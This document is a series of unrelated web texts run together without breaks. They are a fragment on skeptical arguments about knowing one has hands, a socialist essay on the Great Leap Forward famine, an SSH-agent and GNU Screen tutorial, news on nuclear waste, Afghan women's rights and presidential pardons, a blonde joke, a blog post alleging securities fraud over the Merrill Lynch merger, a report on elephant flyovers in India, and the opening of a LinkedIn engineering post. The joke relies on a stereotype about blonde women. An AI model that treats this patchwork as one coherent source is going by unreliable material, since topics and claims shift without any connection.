( D2 ) If I know that some evidence is misleading , then I know that I should disregard that evidence .
Therefore : ( D3 ) If I know that I have hands , then I know that I should disregard any evidence to the contrary .
( D4 ) I do not know that I should disregard any evidence to the contrary .
Therefore : ( D5 ) I do not know that I have hands .
The BIV - Epistemic Possibility Argument ( BEPA ) ( P1 )
It ’s at least possible that I ’m a BIV .
( P2 ) If it ’s possible that I ’m a BIV , then it ’s possible that I do n’t have hands .
( P3 ) If it ’s possible that I do n’t have hands , then I do n’t know that I have hands .
Therefore : ( P4 ) I do n’t know that I have hands .
Obviously , this list of skeptical arguments could be extended by varying either ( a ) the skeptical hypothesis employed , or ( b ) the kind of cognitive success being challenged , or ( c ) the epistemological principles that link the hypothesis in ( a ) and the challenge in ( b ) .
Some of the resulting skeptical arguments are more plausible than others , and some are historically more prominent than others , but there is n’t space for a comprehensive survey .
Here , we will review some of the more influential replies to BKCA , BJUA , BKDA , and BEPA .
6.2 Responses to the Closure Argument
Next , we will examine various responses to the BKCA argument .
According to the first , we can see that ( C2 ) is false if we distinguish between relevant and irrelevant alternatives .
An alternative to a proposition p is any proposition that is incompatible with p.

April 21 , 2009 -- Socialist Voice --
On October 1 , the People ’s Republic of China will mark the 60th anniversary of its foundation .
This will be an occasion to celebrate one of the most influential victories of popular struggle in our era .
This great uprising forged a united and independent Chinese state , freed the country from foreign domination and capitalist rule , ended landlordism , provided broad access to education and health care , and set in motion popular energies that modernised and industrialised its economy .
The revolutionary triumph of 1949 laid the foundation for China ’s present dynamism and influence , as well as providing an enormous impetus to anti-colonial revolution worldwide .
Yet despite these gains , the socialist movement and ideology that headed the revolution , identified with Communist Party Chairman Mao Zedong , disappeared from China soon after his death in 1976 .
The revolution ’s central leader is still revered , but his doctrines have been set aside .
The country ’s present leadership has promoted private capitalist accumulation , not socialist planning , as China ’s chief engine of growth .
Its policies have aroused much popular protest , but not a revived Maoist movement .
How was revolutionary China diverted onto a capitalist path ?
This setback has a lengthy prehistory , reaching back to the impact on Chinese Communist Party of policies identified with Joseph Stalin in the late 1920s .
But much can be learned by considering the first major setback of the People ’s Republic , a dark episode that reached its culmination exactly 50 years ago .
This was China ’s 1958 - 60 “ Great Leap Forward ” -- an ambitious and failed attempt to jump - start rapid industrialisation by reshaping China ’s countryside .
Revolutionary breakthrough
The first years of the People ’s Republic saw great progress in every sphere : the forging of a unified state ; facing down imperialist reprisals , including by halting the US military in the 1950 - 53 Korean War ; surviving isolation and reprisals ; economic revival ; and the beginnings of industrialisation .
Above all , the Chinese peasantry , the driving force of the revolution , carried out a radical land reform and restored the rural economy .
In 1955 almost the entire peasantry pooled its lands in cooperative farms .
But as China ’s first Five - Year Plan for economic development drew to a close in 1957 , there were signs of disequilibrium , including massive unemployment in the cities and underutilisation of labour in the countryside , ills that China ’s focus on capital - intensive heavy industry had failed to address .
The Communist Party leadership responded with a plan for “ simultaneous development ” of heavy and light industry , carried out in both urban centres and rural areas , in a crash campaign to mobilise a large portion of the rural workforce in labour - intensive industrial and infrastructural development .
The goals were praiseworthy , but how was this massive new industrial work force to be organised and fed ?
‘ Great Leap ’
It was this challenge that inspired the launch of the Great Leap Forward at the beginning of 1958 -- a campaign to produce “ more , faster , better and cheaper . ”
In factories , hours of work were lengthened and production quotas raised .
In rural areas , small - scale industrial projects were started up , the most publicised being “ backyard blast furnaces ” to produce iron and steel .
Peasants were mobilised for major irrigation and other land - improvement projects .
Planning was based on projections that food production per hectare could be swiftly increased five to 20 times over , through introduction of large - scale collective farms and the use of new , unproven techniques of cultivation .
These projections inspired Mao to declare that “ planting one - third [ of the land ] is enough . ”
So labour could safely be diverted to industrial projects .
As the campaign unfolded , a new social form was invented -- the “ people ’s communes ” -- each of which organised tens of thousands of peasants for collective field labour , industrial work and land improvement projects .
In the course of 1958 , several hundred million peasants were enrolled in the communes .
Broadly speaking , the program was modelled on collectivisation in the Soviet Union under Joseph Stalin after 1928 , a program that aimed to enable the state to get direct control of peasant production and divert a large part of it to the support of industrialisation .
As in the Soviet Union , the results in China were discouraging .
National economic planning gave way under the strain .
Shortages of raw materials and transportation blockages spread .
Some rural industry projects took root , but waste was enormous , and rural steel production proved a costly failure .
Floods and droughts aggravated the crisis .
Most ominous of all , agriculture was crippled by the many forms of disruption engendered by the communes , and the grain harvest fell by about 30 % .
By 1959 , the entire country was gripped by hunger , which lasted through 1960 .
Starvation claimed millions of victims .
It took 15 years to bring per-capita grain production back up to pre-Great Leap levels .
Famine and revolution
It is not unusual for the upheaval of revolution to be accompanied by a crisis of food production .
The young Russian Soviet republic , for example , experienced a severe famine in 1920 - 21 .
Its causes were clear : seven years of devastation by war and civil war , which had led to a collapse of urban - rural economic exchange .
The Soviet government energetically publicised this tragedy , calling in aid organisations set up by the world workers ’ movement as well as pro-capitalist agencies such as the American Relief Agency headed by later US president Herbert Hoover .
Within a few months , the Soviets enacted the New Economic Policy ( NEP ) , which restored the peasants ’ right to trade grain freely ; agricultural recovery was swift .
But the course of the Chinese food crisis of 1959 - 60 had more in common with that in Stalin ’s Soviet Union during 1932 - 33 , where forced collectivisation led to a hidden famine that claimed an estimated 6 - 8 million victims .
In the Chinese case , the food crisis was shrouded in secrecy .
Suspicions of a major Chinese famine seemed outlandish , since abolition of famine had been one of the revolution ’s proudest achievements .
Moreover , the Great Leap began under conditions of peace and rising production .
Outside observers were misled by the 50 % increase in China ’s grain exports during the Great Leap years .
It was not until after Mao ’s death , two decades later , that the famine ’s extent became widely known outside China .
There is today in China no independent movement of workers and peasants who can convey to us their historic memory and assessment of this experience .
In preparing this article , I focused on sources that are sympathetic to the Chinese revolution and its achievements , avoiding those poisoned by anti-Communist bias .
But even sympatheic writers report many barriers in reconstructing the course of events .
One three - person team says that on their first field trip , a month of intensive interviewing did not get at any of what were later revealed to be the key facts in the history of the village under investigation .
The Great Leap ’s toll
In this challenging context , the Great Leap experience has become the focus of raging controversy between Mao ’s defenders and detractors .
Typical is the disagreement over the number of famine deaths .
In the early 1980s , the Chinese government released demographic statistics pointing to 15 million famine - related deaths .
Writers hostile to the People ’s Republic claim this is an understatement , offering estimates as high as 38 million .
Mao ’s supporters say all these estimates are unreliable and biased attempts to besmirch Mao ’s memory , but even they concede that a serious famine took place and that the death toll was high .
Among them , Robert Weil concedes 15 million or more “ excess deaths ” ; Mobo Gao puts the total at 8.3 million ; William Hinton estimates a “ demographic gap ” of more than 13 million , including through a decline in the birth rate .
( See “ Sources ” below . )
As Gao notes , “ even the lowest estimate of several million deaths cannot gloss over the disaster ” .
Mao ’s defenders stress the enduring achievements of the People ’s Republic ’s early years , comparing them favourably with the ambiguous record of the recent period .
They are on strong ground here .
While conceding the Great Leap ’s excesses , Mao ’s defenders argue that he was not personally responsible ; other leaders and subordinates , they say , were mainly to blame .
Even if that is true , it tells us nothing about the Great Leap policies as such .
Moreover , Mao ’s defenders have little to say regarding the function and structure of the newly formed people ’s communes .
They leave unchallenged the analysis presented in a number of recent detailed studies of village life in the Great Leap period , such as those by Edward Friedman et al. , Ralph Thaxton , and also Mobo Gao .
The communes ' central importance , these studies tell us , lay in transferring the organisation of farm labour , the disposal of peasants ’ production and the responsibility for feeding rural producers from the peasant family to an administration that was usually located outside the village and was not subject to its control .
So great was the prestige among the peasants of the government -- their government -- that this change was accepted with little resistance , and promises that it would bring peasant prosperity were greeted with enthusiasm .
But the actual outcome was to allocate more food to the cities and to state officials and less to rural producers , depriving them of hard - won food security .
Peasants were forbidden not only from buying or selling grain but also from traditional handicraft sidelines like rope- making .
Small plots for family cultivation were abolished .
Food was provided by communal kitchens -- indeed cooking at home was banned .
In some cases , peasant homes were torn down ( without compensation ) and peasants camped out in tents in the fields .
Field work extended to 12 hours a day .
Peasants could no longer travel without permission .
Rations in the communal kitchens , generous at first , were progressively reduced to starvation levels .
The commune became a trap : peasant families had lost access to traditional recourses to stave off a food emergency .
A massive campaign to collect scrap iron for rural blast furnaces turned into an assault on the rural household : even iron cooking utensils and door hinges were seized and fed to the furnaces , leaving doorways gaping empty in the wind .
Tragically , the furnaces produced little that was usable , and most were soon abandoned .
Meanwhile , local officials faced pressure to exaggerate in reports on crop yields .
Many of those who insisted on truthful reporting were punished .
Aggressive state grain procurement left peasants with less than the minimum needed to assure subsistence .
“ The end result of all this ” , writes Mobo Gao , “ was that the rural residents were left to starve ” .
New inequalities
Even in crisis conditions , distribution of food was unequal .
The grain ration in 1960 - 61 was 8 jin / month for peasants , 21 jin for factory workers and 24 jin for party officials whose need was less because they did not carry out manual labour ( 1 jin = 500 grams ) .
The state preached equality but in reality provided privileges to those with access to networks of influence and power .
Scarce goods were distributed to officials according to rank , through a five - tier supply system .
The principle of equality was also violated by creation of a caste of pariahs in the villages , composed of so - called landlords , rich peasants and rightists .
The landlords and rich peasants designation was based on landholdings long since swept away by the land reform .
Outcast status was passed on to children .
An “ anti-rightist ” campaign , launched in 1957 , targeted above all those who had complained about bureaucratic corruption or abuses .
Millions were labelled rightists , in part because of government rewards to localities that placed more than 5 % in that category .
During the Great Leap , anyone who complained about government policy faced the danger of being hurled down into this stigmatised caste .
Hundreds of thousands were sent to labour camps , where they were held for many years .
Reprisals against suspected dissidents included “ public criticism ” , in which suspects were subjected to verbal and physical abuse as a means of extraction admissions of guilt .
Other punishments included withdrawal of food rations , beatings and , in some cases , killings .
Do such reports represent exceptional cases ?
It is true that Ralph Thaxton ’s study concerns a province , Henan , where the regional authorities ’ extreme application of the Great Leap policies , originally lauded as a model , was later disavowed by the central government .
But available sources do not report any trace of open public discussion of Great Leap policies , either nationally or on the commune level .
These sources do not report any instances during the Great Leap where peasants successfully overturned an abusive commune or village leadership , even in communes that held back reserves in their granaries during the worst of the famine .
Nor is there evidence of attempts by the central leadership to establish guidelines to protect working people against abuse of power , safeguard dissident voices , or guarantee of the right of working people to join together in advocating alternative policies .
The way the Great Leap ended gives us something of its extremist flavour .
In 1961 , peasants were granted “ three freedoms ” -- to cultivate a small private plot of land , to cook in private homes and to engage in petty trade .
Other restrictions on peasant activity also eased .
Meanwhile , China stopped its multimillion - ton grain exports and began importing grain in similar quantities .
Recovery was rapid .
Robert Weil reports that life expectancy in 1962 was double the Great Leap level and higher than before the emergency .
Food production picked up as well , although full recovery took many years .
Capitalist road
At the height of the Great Leap , in August 1959 , Peng Shuzi , a Chinese communist forced into exile a decade earlier for his dissident views , termed the newly formed people ’s communes “ an effective instrument in the hands of the CCP for exploiting and controlling the peasant ” .
Peng believed that this “ exploitation ” was different from what we experience under capitalism : the intended beneficiary was not a private capitalist but the national economy from which those in power drew their privileges .
But for the peasantry the coercive transfer of wealth out of the hands of local producers had similarities to landlordism .
And despite the egalitarian idealism that was so prominent at the Great Leap ’s outset , the communes functioned in a manner similar to a capitalist factory -- but with no right to form a union or to change jobs .
The Great Leap thus prefigured the exploitative system that emerged after Mao ’s death .
When the Chinese government ultimately pulled back from the most destructive policies of the Great Leap , it did not repudiate the hierarchy , privilege and disregard for workers ’ democracy that characterised those years .
The architects of the Great Leap hoped that its arbitrary , coercive and destructive character would be justified by a jump in production .
This , they hoped , would create the preconditions for a truly just society .
However , the resulting collapse of production is strong evidence that socialist policies must not destroy but build on worker and peasant culture , wisdom , initiative and control -- what the Venezuelan revolutionists today call “ protagonism ” .
The setbacks in the Great Leap included not only the tragic famine but also the weakening of the ties between Chinese working people and the new state they had created .
It marked a step on the road that led ultimately to the rise of a capitalist system of production in the People ’s Republic .

GNU Screen and OpenSSH are two incredibly useful tools .
In this tutorial , I hope to help users to work around a small , but annoying , problem that can arise when using SSH - Agent forwarding and Screen .
This tutorial assumes you have knowledge of SSH , SSH - Agent , SSH - Agent - forwarding and GNU Screen .
I also assume you 're using a shell that can handle Bourne shell variable syntax .
The Problem
SSH - Agent forwarding breaks when screen is re-attached on a different host .
Details
The problem involves three hosts * , A , B , and S . All of these hosts have Agent - Forwarding enabled in their SSH configuration .
I log into host A and run ssh- agent , authenticating to my key .
I connect from machine A to machine S using my agent / key to authenticate .
On machine S , I start screen .
I open several screen windows , all running shells .
These shells inherit the ssh - agent variables from the parent shell that spawned the screen .
( This is where the problem starts . )
I notice that it 's time for work , so I drive to work and log into machine B , starting ssh- agent and authenticate to my key .
I connect from machine B to machine S using my agent / key to authenticate .
I resume the running screen that I started when logged in from machine A. Naturally , all of the ssh environment variables are still set the way they were prior to the screen de / re-attach .
So now , despite having ssh - agent forwarding turned on and having an active agent , I can't connect to remote hosts via host S without some kind of magic .
* This problem could also involve two connections from the same host ( which will be on different client ports , ) to a second host .
I think the above example is clearer .
SSH Environment Variables
When you connect , using ssh - agent for authentication , to a host that has ssh - agent forwarding enabled , the following shell variables will be set :
SSH_CLIENT=192.168.25.198 4671 22 SSH_TTY=/dev/pts/11
SSH_AUTH_SOCK=/tmp/ssh-zIn16635/agent.16635 SSH_CONNECTION=192.168.25.198 4671 192.168.25.3 22
The SSH_CLIENT variable contains three space - separated pieces of information .
The IP address of the client making the connection , the client 's port number , and the server 's port number .
The SSH_TTY variable is set to the path to the tty device used for the shell opened when the SSH connection was created .
The SSH_AUTH_SOCK variable identifies the path of a unix - domain socket used to communicate with the agent .
In other words , this variable sets up a " path " back to the host that is actually running the agent , so that future ssh connections can talk to /use that agent .
The SSH_CONNECTION variable contains four space - separated pieces of information .
The IP address of the client , the port number of the client , the IP address of the server and the port number of the server .
This variable is necessary to prevent agent hijacking .
So , now that I 've reiterated the ssh ( 1 ) man page , we can see why , when we connect from A to S , and then from B to S , ssh - agent forwarding fails .
In the initial connection , S defines the SSH environment variables to point to host A .
When screen starts its shells , they inherit those variables .
When host B connects and grabs that instance of screen , the sub - shells have no idea that anything has changed , so the variables now point to the " wrong " machine .
The Solution
The environment variables listed above are set correctly when host B connects to host S , so we need a way to get them propagated to the shells running inside screen .
I wrote a small script to cull them out and stick them in a file .
The script also re-formats them so that they will be easily integrated into the shell 's environment .
I called this script " grabssh . "
#!/bin/sh SSHVARS=" SSH_CLIENT
SSH_TTY SSH_AUTH_SOCK SSH_CONNECTION DISPLAY " for x in $ {SSHVARS} ; do ( eval echo $ x= \ $ $x ) | sed 's /=/= " / s/$/ " / s/^/export /' done 1>$HOME / bin/ fixssh
The output of this script looks something like this :
export SSH_CLIENT =" 192.168.25.198 4685 22 " export SSH_TTY= " /dev/pts/22 " export SSH_AUTH_SOCK= " /tmp/ssh-jtF17289/agent.17289 " export SSH_CONNECTION =" 192.168.25.198 4685 192.168.25.3 22 "
Rather than having to type in " grabssh " before resuming any screen , I created an alias :
alias Attach= ' grabssh ; screen -d -R '
So now every time I resume my screen , the correct ssh - agent variables will be written to $ {HOME} / bin / fixssh .
I wrote another alias to source that file :
alias fixssh= ' source $ HOME / bin / fixssh '
Now , when I 'm in a screen - spawned shell and I want to take advantage of ssh - agent forwarding , I run " fixssh " and everything just works .
You might even go so far as to create an alias for ssh like this :
alias ssh= ' fixssh ; ssh '
However , that alias might someday drive you insane if you 're troubleshooting some ssh problem and you forget that it is there .

While President Obama 's plan to find alternatives to storing high - level nuclear waste at Yucca Mountain , Nev. , is grabbing headlines , another problem has begun threatening license applications for new reactors .
What can be done with low - level nuclear waste ?
There are dwindling places to put low - level nuclear waste -- contaminated resins , filters , wood , paper , plastics , pipes , structural steel and pressure vessels that can be hazardous for up to 500 years .
And nuclear - power opponent groups are filing and winning legal fights to force utilities to present disposal plans for low - level waste before they can build a new reactor .
" I 'm going to argue low - level waste is a bigger issue than high - level waste right now , " Edward Sproat , then - director of the Energy Department 's Office of Civilian Radioactive Waste Management , warned at a Center for Strategic and International Studies event last fall .
While the nuclear industry is unhappy about Yucca Mountain 's impending demise , officials recognize it will not immediately threaten the 17 license applications filed for new reactors .
The Nuclear Regulatory Commission has determined that spent fuel can be stored on - site for the next century and is reviewing a possible extension of that .
But the low - level waste problem is already affecting reactor applications .
The Southern Alliance for Clean Energy this month won a legal contention from the Atomic Safety and Licensing Board against Southern Nuclear Operating 's Vogtle reactor license application for Georgia .
The same contention has already been granted in reviews of the Tennessee Valley Authority 's Bellefonte application in Alabama ; Unistar 's Calvert Cliffs , Md. , application ; and Dominion Power 's North Anna application in Virginia .
Advocacy groups plan to similarly contest Progress Energy 's Levy County , Fla. , application and have already filed against Detroit Edison 's Fermi application .
Sara Barczak , program director for the Southern Alliance , said the focus on low - level waste represents a significant shift for regulators and utilities .
" I think most people , when they see ' low level , ' they say , ' Oh , low level of radioactivity , ' but the definition of low level is so broad , " she said .
U.S. low - level waste comes from a wide range of places , including hospitals and laboratories , but the greatest -- and most toxic -- volume is produced by the Energy Department and the 104 commercial nuclear reactors .
Toxic for up to 100 years , Class A waste has just three storage options -- sites at Clive , Utah ; Richland , Wash . ; and Barnwell , S.C. Only Richland and Barnwell accept Class B waste , which is toxic for up to 300 years , and Class C , toxic up to 500 years .
But there is another complication : Barnwell closed its gates to all states but Connecticut , New Jersey and South Carolina last summer .
And Richland only accepts waste from 11 states in the Northwest and Rocky Mountain compacts .
That means 36 states with reactors , hospitals and other industry with radioactive materials have no place to send much of their waste .
Short - term fixes
Existing disposal facilities have adequate capacity for most low - level radioactive waste and are accessible to waste generators in the short term , but constraints on the long - term disposal of class B and C wastes have become clear , according to a report by the Government Accountability Office last year .
" The nuclear industry has really been hiding their head in the sand about the waste for all issues , " said Michael Mariotte , executive director of the nonprofit Nuclear Information and Resource Service , which opposes nuclear power .
Mariotte said utilities that want to build new reactors have known for 10 years that Barnwell would close but failed to include on - site storage or options for handling low - level radioactive waste in their license applications .
" There is a very clear issue that utilities have to figure out what they are going to do , " Mariotte said .
" Just from a regulatory standpoint , on the high - level waste , they can point to the waste confidence rule , but they do n't have a counterpart for low - level waste . "
Utilities have a simple , short - term option , according to the Nuclear Energy Institute , an industry group .
" They are going to have to , they will end up filing plans to store on - site , " said Doug Walters , senior director for new plants at NEI .
Walters said most existing nuclear power plants are already considering building on - site storage for low - level waste .
Moreover , he said , most of the new reactors would be built on the same sites as current reactors .
But that approach is not that simple , nuclear foes say .
It is likely to increase the already hefty cost of building reactors and increase the complaints of regulators and nearby communities that are already upset at the storage of spent fuel rods , Mariotte said .
More dumps ?
Another possible solution would involve opening more waste disposal sites .
But permitting a dump site for Class B and Class C material is almost as difficult as siting a high - level waste dump .
In 1980 , Congress passed a law that made states responsible for disposal of their own wastes , but states were encouraged to form compacts to locate one low - level radioactive waste site for several states .
The law also excluded low - level waste from the Interstate Commerce Clause , so shipments across state lines are not allowed unless approved by individual states or compacts .
Since the law passed , the Clive , Utah , facility has been the only waste site created .
North Carolina and Nebraska pulled out of compacts after being chosen as disposal sites , and Michigan was expelled by the Midwest compact for failing to site a dump .
There is also little incentive for companies to try to license and develop new low - level waste sites , because nuclear plants , which generate most of that waste , have managed to dramatically reduce their volume and store more on site , according to Todd Lovinger , executive director of the Low - Level Radioactive Waste Forum , a nonprofit that is helping state compacts comply with the low - level waste law .
The low - level waste volume stands to rise somewhat if some new reactors come on line , but not significantly , said Mitch Singer , a spokesman for NEI .
Texas regulators in January granted a license to Waste Control Specialists LLC for a new low - level waste dump in Andrews County , which is at the New Mexico line .
The site is licensed to take waste from Texas , Vermont and the federal government , but there are concerns that it could open to other states with no place to put their wastes .
The company says its current waste stream is sufficient , spokesman Ricky Dailey said .
The Texas location is also over the " precarious , irreplaceable " Ogallala Aquifer , which provides water for eight states in the Great Plains , said Kevin Kamps of Beyond Nuclear .
Legislation
The lack of storage space for low - level radioactive waste has grabbed attention on Capitol Hill .
Lawmakers started getting involved after the operator of the Clive , Utah , Class A storage site filed a license in 2007 to import 20,000 tons of Italian low - level waste .
The Italian waste would take up less than 1 percent of total volume at the EnergySolutions facility , and CEO Steve Creamer promised to limit total foreign imports to 5 percent of the facility .
But Reps. Bart Gordon ( D - Tenn . ) and Jim Matheson ( D - Utah ) say the Italian waste could just be the beginning of the low - level waste influx .
They have introduced a bill banning foreign import of low - level radioactive waste unless there is an exemption from the president .
" We are going to run out of waste space here , " Gordon told reporters after introducing the bill this session .
" Of 104 nuclear power plants in this country , 94 have no other place to go but Utah . "
An earlier version of this article misstated the licensing status of Waste Control Specialists LLC for operating a low - level nuclear waste disposal site .
The company received a license from Texas regulators in January to operate such a site ; it is not in the process of applying .
The article also omitted a response from Texas state officials to an environmentalist 's contention that nuclear waste disposal posed a potential threat to the Ogallala Aquifer , which provides water for eight states in the Great Plains .
The Texas Council on Environmental Quality says that the waste site is over a part of the Ogallala aquifer formation that is driest and farthest from the surface and that it is continuing to monitor the formation 's interaction with groundwater .

Joke of the Day – A blonde ’s flight to Houston
A plane is on its way to Houston when a blonde in Economy Class gets up and moves to the First Class section and sits down .
The flight attendant watches her do this and asks to see her ticket .
She then tells the blonde that she paid for Economy and that she will have to sit in the back .
The blonde replies “ I ’m blonde , I ’m beautiful , I ’m going to Houston and I ’m going to stay right here ! ”
The flight attendant goes into the cockpit and tells the co-pilot that there is a blond bimbo sitting in First Class that belongs in Economy and wo n’t move back to her seat .
The co-pilot goes back to the blonde and tries to explain that because she only paid for Economy she will have to leave and return to her seat .
The blonde replies , “ I ’m blonde , I ’m beautiful , I ’m going to Houston and I ’m staying right here ! ”
The co-pilot tells the pilot that he probably should have the police waiting when they land to arrest the dumb blonde woman who wo n’t listen to reason .
The pilot says “ You say she is blonde ?
I ’ll handle this , I ’m married to a blonde .
I speak blonde . ”
He goes back to the blonde , whispers in her ear , and she says “ Oh , I ’m sorry , ” gets up and moves back to her seat in the Economy Section .
The flight attendant and co-pilot are amazed and asked him what he said to make her move without any fuss .
“ I told her First Class was n’t going to Houston . ”

Afghanistan 's president , Hamid Karzai , came under intense western pressure yesterday to scrap a new law that the UN said legalised rape within marriage and severely limited the rights of women .
At a conference on Afghanistan in The Hague , Scandinavian foreign ministers publicly challenged the Afghan leader to respond to a report on the new law in yesterday 's Guardian , and the US secretary of state , Hillary Clinton , was reported to have confronted Karzai on the issue in a private meeting .
At a press conference after the meeting , Clinton made clear US displeasure at the apparent backsliding on women 's rights .
" This is an area of absolute concern for the United States .
My message is very clear .
Women 's rights are a central part of the foreign policy of the Obama administration , " she said .
The Guardian reported that Karzai had signed the controversial law last month .
The text has not yet been published but the UN , human rights activists and some Afghan MPs said it included clauses stipulating that women cannot refuse to have sex with their husbands , and can only seek work , education or visit the doctor with their husbands ' permission .
International aid officials say the law violates both UN conventions and the Afghan constitution .
It is widely seen as a political ploy by Karzai to win support from conservative Muslims in presidential elections scheduled for August .
Mark Malloch Brown , Britain 's foreign office minister for Africa , Asia and the UN , expressed " dismay " over the law 's impact on women 's rights .
" We are caught in the Catch - 22 that the Afghans obviously have the right to write their own laws , " he said .
" But there is dismay .
The rights of women was one of the reasons the UK and many in the west threw ourselves into the struggle in Afghanistan .
It matters greatly to us and our public opinion . "
Malloch Brown did not meet Karzai yesterday , but said " one can confidently assume " that it came up in the private bilateral sessions the Afghan leader held with western officials in the course of the day .
Diplomatic sources said later that women 's rights had been one of the subjects of the Clinton - Karzai meeting .
At the Hague conference , instigated at Washington 's request to rally international support for Obama 's new strategy in Afghanistan , Finland 's foreign minister , Alexander Stubb , called on the Karzai government to respond to the Guardian report , a call echoed by Iceland , while Norway also expressed concern over the trend in women 's rights .
Fox analyst : Bush can't issue blanket pardons for torture David Edwards and Muriel Kane
Published : Tuesday November 18 , 2008
Print This Email This George W. Bush " is not a big pardon guy , " says a Fox News legal analyst , but there has been increasing speculation that he might wield the pardon power more generously as he prepares to leave office .
However , there are some pardons that Bush either cannot or will not issue .
" The president can still pardon anybody he wants at any time he wants for anything done in their past for a federal violation , " former judge Andrew Napolitano explained to the hosts of Fox and Friends on Tuesday .
" He has so much absolute pardon power , he could pardon himself . "
But although Bush might even pardon individuals who have not yet been charged -- as Gerald Ford did for Richard Nixon -- Napolitano insisted that he cannot issue a blanket pardon to everyone who may have engaged in extreme interrogation techniques .
" You 've got to name them , " Napolitano explained .
" You can't pardon somebody without saying who it is . "
Napolitano 's opinion appears to contradict much recent speculation about possible Bush pardons , with several commentators citing President Jimmy Carter 's blanket pardon of Vietnam era draft - dodgers on the day after his inauguration .
However , the executive order issued to put Carter 's pardon into effect referred specifically to canceling ongoing indictments , investigations , and prohibitions against returning to the United States for violations of the Military Selective Service Act , all of which would have involved named inviduals .
In addition to his general comments on the pardon power , Napolitano stated firmly that he does not expect to see a pardon for Scooter Libby .
Bush commuted Libby 's sentence in the Valerie Plame affair , saving the former White House aide from having to serve any time in jail , but without a pardon , Libby is still barred from practicing law .
" The essence of a pardon is mercy , not justice , " Napolitano stated .
" What also plays a role in it is , has the person paid back their debt to society .
... George Bush , when he has pardoned people , has usually pardoned people who have already served their time and are out .
He has not ' sprung ' them from jail . "

New York State Attorney General Andrew Cuomo's letter to the SEC and Senate Banking Committee on the Bank of America , Merrill Lynch Merger provides strong evidence of coercion to commit securities fraud by former Treasury Secretary Paulson and Fed Chairman Ben Bernanke , and actual securities fraud by Bank of America CEO Kenneth D. Lewis .
At issue is Lewis 's decision to back away from the merger deal with Merrill Lynch on a MAC ( material adverse change ) clause because of rapidly deteriorating conditions at Merrill Lynch .
Here are a few pertinent snips from Cuomo 's letter .
Immediately after learning on December 14 , 2008 of what Lewis described as the " staggering amount of deterioration " at Merrill Lynch , Lewis conferred with counsel to determine if Bank of America had grounds to rescind the merger agreement by using a clause that allowed Bank of America to exit the deal if a material adverse event ( " MAC " ) occurred .
After a series of internal consultations and consultations with counsel , on December 17 , 2008 , Lewis informed then - Treasury Secretary Henry Paulson that Bank of America was seriously considering invoking the MAC clause .
Paulson asked Lewis to come to Washington that evening to discuss the matter .
At a meeting that evening Secretary Paulson , Federal Reserve Chairman Ben Bernanke , Lewis , Bank of America 's CFO , and other officials discussed the issues surrounding invocation of the MAC clause by Bank of America .
The Federal officials asked Bank of America not to invoke the MAC until there was further consultation .
There were follow - up calls with various Treasury and Federal Reserve officials , including with Treasury Secretary Paulson and Chairman Bernanke .
During those meetings , the federal government officials pressured Bank of America not to seek to rescind the merger agreement .
We do not yet have a complete picture of the Federal Reserve 's role in these matters because the Federal Reserve has invoked the bank examination privilege .
Bank of America 's attempt to exit the merger came to a halt on December 21 , 2008 .
That day , Lewis informed Secretary Paulson that Bank of America still wanted to exit the merger agreement .
According to Lewis , Secretary Paulson then advised Lewis that , if Bank of America invoked the MAC , its management and Board would be replaced .
In an interview with this Office , Secretary Paulson largely corroborated Lewis 's account .
On the issue of terminating management and the Board , Secretary Paulson indicated that he told Lewis that if Bank of America were to back out of the Merrill Lynch deal , the government either could or would remove the Board and management .
Secretary Paulson 's threat swayed Lewis .
According to Secretary Paulson , after he stated that the management and the Board could be removed , Lewis replied , " that makes it simple .
Let 's deescalate . "
Lewis admits that Secretary Paulson 's threat changed his mind about invoking that MAC clause and terminating the deal .
Coercion To Commit Securities Fraud
Flashback Monday , September 15 , 2008
“ There was no pressure from regulators , absolutely no pressure , ” said Mr Lewis , who described the deal as “ the strategic opportunity of a lifetime ” .
He said : “ The first contact came on Saturday morning and we put the transaction together in 48 hours .
The instant we talked it made sense . ”
My Translation : " The pressure from the Fed was enormous .
Anyone in their right mind knows this deal makes no sense to Bank of America " .
....
The moral of this story is :
The strong swallow the weak until the strong become weak .
In an interview with this Office , Secretary Paulson largely corroborated Lewis 's account .

Elephant fatalities will be reduced by ' trunk routes ' over busy roads and railway tracks in national park
This article is more than 11 years old
This article is more than 11 years old
Indian authorities are about to build the world 's first " flyover " routes for elephants to save them from accidents on roads and railways .
The jumbo trunk roads , costing £ 9 m , will be built to stop accidents on roads and railway lines that cross Rajaji national park in Uttarakhand state near the Himalayan foothills .
Two flyovers , each 1.2 km long and 100 metres wide , will be covered in foliage to resemble the natural environment and encourage the animals to use them .
At least 118 Asian elephants , an endangered species , have died on rail lines in India since 1987 .
Highway authority plans to expand a road through the park into a four - lane highway between the pilgrim towns of Haridwar and Rishikesh have exacerbated the problem .
The solution came as plans for a vehicle flyover and an underground rail tunnel were ruled out as technically too problematic .
The park 's 400 wild elephants , which usually roam in search of fresh watering holes , will enter wide funnels at either end of the elevated corridors and then be channelled on to bridges over the deadly roads .
" The elephants are very sensitive to vibrations but the experts think that if the flyover is high enough they can cross , " director of conservation for the Wildlife Trust of India , Dr Rahul Kaul , told the Guardian .
" You have to get it right first time .
The problem is that there are no examples , no precedents in the world at the moment , " he added .
The plan comes after six years of exhaustive efforts to prevent the accidents , including night patrols and an awareness campaign for train drivers .
There have been no recorded human casualties and only one recorded derailment .
Steep embankments that prevented elephants from avoiding oncoming trains have also been flattened out .
This put a temporary halt to deaths – 20 between 1992 and 2002 – on the 18 km stretch of track that passes through the protected area , but park authorities wanted a long - term solution .
Rajaji national park , which covers an area of 820 square kilometres , has fossil remains of 50 elephant species that date back 10 m years .
The Asiatic elephant , Elephas maximus , is the largest land mammal in Asia , weighing up to five tonnes , with a life expectancy of 70 years .
There are about 35,000 Asian elephants in India and 12 other countries in south - east Asia .
Two adults , including a pregnant female , and a juvenile male of about six years were hit and killed in the last recorded train incident in February 2008 in the Coimbatore district of the southern Indian state of Tamil Nadu .
If the flyovers in Rajaji are given the go - ahead by India 's supreme court , they are likely to be completed in nine months .
The ambitious project is a rare victory for conservation in India , which has seen the population of its national animal , the Bengal tiger , reduced to about 1,400 – more than half have been lost in the past five years .
Code Alert !
This is a part of our continuing series on Engineering at Linked In .
If this is n’t your cup of Java , check back tomorrow for regular Linked In programming .
In the meanwhile , check out some of our recent announcements , tips and tricks , or success stories .
About a month ago Linked In released the code for an open source distributed storage system called Project Voldemort .
I wanted to give a little more information about what it is good for , how it came to be , and what our plans are for the future .
Some Background
Like a lot of websites , Linked In started with a single big database and a cluster of front - end servers ( unlike a lot of websites it also started out with a big social graph in memory on remote machines , but that is a different story ) .
